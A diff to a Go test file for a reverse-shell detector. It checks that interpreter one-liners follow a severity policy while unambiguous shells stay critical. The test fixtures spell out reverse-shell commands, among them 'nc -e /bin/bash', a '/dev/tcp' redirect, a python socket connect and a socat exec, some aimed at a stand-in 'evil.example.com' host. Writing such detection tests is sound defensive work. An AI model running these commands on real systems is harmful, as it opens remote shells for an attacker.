@@ -141,30 +141,34 @@ func reverseShellThreats(threats []ThreatEvent) []ThreatEvent {
 // one-liner class (python -c, perl -e, ...) can be downgraded/disabled, while
 // the unambiguous class (nc -e, /dev/tcp/, ...) always stays critical.
 func TestReverseShellOneLinerPolicy(t *testing.T) {
-	// A genuine python one-liner reverse shell (carries socket + IP, so it
-	// passes the network-indicator gate and is classified as a one-liner).
-	oneLinerCmd := `python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))`
+	// A PURE interpreter one-liner: matches `python3 -c` and carries a network
+	// indicator (a host:port endpoint) but NO unambiguous socket indicator, so
+	// it is genuinely the downgradeable one-liner class.
+	oneLinerCmd := `python3 -c __import__('pty').spawn('/bin/bash') # 10.0.0.1:4444`
 	// An unambiguous reverse shell — must stay critical under every policy.
 	strongCmd := `nc -e /bin/bash 192.168.1.100 4444`
+	// A one-liner that ALSO carries an unambiguous indicator (socket.socket).
+	// The knob must NEVER downgrade this: the strong class wins over the
+	// co-occurring one-liner match (code-review #842).
+	mixedCmd := `python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))`
 
 	tests := []struct {
-		policy         string
-		wantOneLiner   ThreatLevel // "" means "no event emitted"
-		wantStrongKept bool
+		policy       string
+		wantOneLiner ThreatLevel // "" means "no event emitted"
 	}{
-		{"critical", ThreatLevelCritical, true},
-		{"", ThreatLevelCritical, true},         // empty → safe default
-		{"CRITICAL", ThreatLevelCritical, true}, // case-insensitive
-		{"bogus", ThreatLevelCritical, true},    // unknown → safe default
-		{"warn", ThreatLevelWarning, true},
-		{"off", "", true},
+		{"critical", ThreatLevelCritical},
+		{"", ThreatLevelCritical},         // empty → safe default
+		{"CRITICAL", ThreatLevelCritical}, // case-insensitive
+		{"bogus", ThreatLevelCritical},    // unknown → safe default
+		{"warn", ThreatLevelWarning},
+		{"off", ""},
 	}
 
 	for _, tt := range tests {
 		t.Run("policy="+tt.policy, func(t *testing.T) {
 			d := NewDetector(0, 0).WithReverseShellOneLinerPolicy(tt.policy)
 
-			// One-liner class.
+			// Pure one-liner class: follows the policy.
 			got := reverseShellThreats(d.Analyze(snapshotWith(oneLinerCmd)))
 			if tt.wantOneLiner == "" {
 				if len(got) != 0 {
@@ -182,10 +186,20 @@ func TestReverseShellOneLinerPolicy(t *testing.T) {
 
 			// Strong class is never affected by the knob.
 			strong := reverseShellThreats(d.Analyze(snapshotWith(strongCmd)))
-			if tt.wantStrongKept {
-				if len(strong) != 1 || strong[0].Level != ThreatLevelCritical {
-					t.Errorf("policy %q: unambiguous reverse shell must stay CRITICAL, got %+v", tt.policy, strong)
-				}
+			if len(strong) != 1 || strong[0].Level != ThreatLevelCritical {
+				t.Errorf("policy %q: unambiguous reverse shell must stay CRITICAL, got %+v", tt.policy, strong)
+			}
+
+			// A one-liner that also carries a strong indicator must stay CRITICAL
+			// under EVERY policy — the knob must not open a blind spot for a real
+			// reverse shell that happens to invoke an interpreter.
+			mixed := reverseShellThreats(d.Analyze(snapshotWith(mixedCmd)))
+			if len(mixed) != 1 || mixed[0].Level != ThreatLevelCritical {
+				t.Errorf("policy %q: one-liner carrying socket.socket must stay CRITICAL, got %+v", tt.policy, mixed)
+			}
+			if len(mixed) == 1 && mixed[0].Evidence.Process.Class != ReverseShellClassStrong {
+				t.Errorf("policy %q: mixed command should be classified STRONG, got class %q",
+					tt.policy, mixed[0].Evidence.Process.Class)
 			}
 		})
 	}
@@ -206,7 +220,10 @@ func TestIsNetworkRelated(t *testing.T) {
 		{"socket keyword", `python3 -c import socket`, true},
 		{"tcp keyword", `socat tcp4:host:4444 exec:/bin/sh`, true},
 		{"udp keyword", `nc -u 1.2.3.4 53`, true},
-		{"connect keyword", `s.connect(("host",4444))`, true},
+		// A bare "connect" with no socket keyword / IP / host:port is NOT a
+		// network indicator — flagging it re-opened #842 for db.connect() etc.
+		{"bare connect no endpoint", `python3 -c engine.connect()`, false},
+		{"connect with host:port", `python3 -c x("evil.example.com:4444")`, true},
 		{"bare ipv4", `nc -e /bin/bash 192.168.1.100 4444`, true},
 		{"ipv4 host:port", `bash -i >& /dev/tcp/10.0.0.1/4444`, true},
 		{"dotted hostname:port", `curl evil.example.com:4444`, true},
